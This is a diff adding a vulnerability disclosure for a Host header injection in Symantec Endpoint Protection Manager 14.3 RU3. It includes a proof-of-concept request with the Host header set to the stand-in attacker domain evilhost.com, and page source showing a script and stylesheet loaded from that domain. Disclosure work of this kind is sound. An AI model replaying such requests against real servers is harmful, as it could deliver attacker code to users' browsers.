@@ -1,0 +1,66 @@
+Host Header Injection Attack
+----------------------------
+We have identified that the  “Symantec Endpoint Protection (Version 14.3 RU3, build 14.3.5413.3000)” is affected by Host Header Injection attacks. HTTP host header can be manipulated and cause the application to behave in unexpected ways. Any changes made to the header would just cause the request to be sent to a completely different Domain/IP address. This is due to that the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behaviour.
+
+
+Details
+
+The test was performed by intercepting the HTTP Get Request “/console/apps/sepm” with a HTTP Proxy tool, and then the original “Host” header value (Symantec Endpoint’s IP) was replaced with the attacker’s domain  (i.e. evilhost.com)  and the  “X-Forwarded-Host” header was added with the Symantec Endpoint’s IP as its value.
+ 
+Although the “X-Forwarded-Host” header is used to override the “Host” header for requests dispatching purposes, the web app still uses the value of the “Host” header (IP/Domain) to add the content of files “AjaxSwing_init.js” and “styles_common.css” in the web page code. This technique allowed us to exploit the issue.
+ 
+Therefore, an attacker would be able to tamper the Host header value during HTTP request interception (MiTM attack), and then the attacker’s domain will be added in the web page code which is used to add the content of arbitrary files, thus forcing the victim’s browser to load the malicious code that is hosted on the attacker’s machine and thus compromising the victim’s machine (Client Side).
+
+
+
+
+Below Evidence is provided:
+
+
+Request:
+GET /console/apps/sepm HTTP/1.1
+Cookie: 511511ff4fffff582d61119ca6ce2111=1111b1f111b9bff1f055ff111c11110
+Host: evilhost.com
+X-Forwarded-Host: 111.111.111.111:8443
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+
+
+
+Response:
+HTTP/1.1 200 
+Cache-Control: no-store, no-cache, must-revalidate
+Expires: Sat, 6 May 1995 12:00:00 GMT
+P3P: CP="CAO PSA OUR"
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: frame-ancestors 'self'
+Referrer-Policy: strict-origin-when-cross-origin
+Feature-Policy: microphone 'none'; geolocation 'none'; usb 'none'; autoplay 'none'
+X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Feature-Policy: microphone 'none'; geolocation 'none'; usb 'none'; autoplay 'none'
+Set-Cookie: JSESSIONID=11111111111111111111111111111; Path=/console; Secure; HttpOnly
+Cache-Control: post-check=0, pre-check=0
+Pragma: no-cache
+X-UA-Compatible: IE=edge
+Content-Type: text/html;charset=UTF-8
+Content-Length: 4982
+Date: Wed, 29 Sep 2021 13:10:33 GMT
+Keep-Alive: timeout=60
+Connection: keep-alive
+Server: SEPM
+
+
+
+Affected Source Code:
+<head>
+    <title>Initializing...</title>
+    <script type="text/javascript" src="https://evilhost.com/console/scripts/ajaxswing/AjaxSwing_init.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://evilhost.com/console/Light_docs/css/ajaxswing/styles_common.css">
+</head>
+
+
+
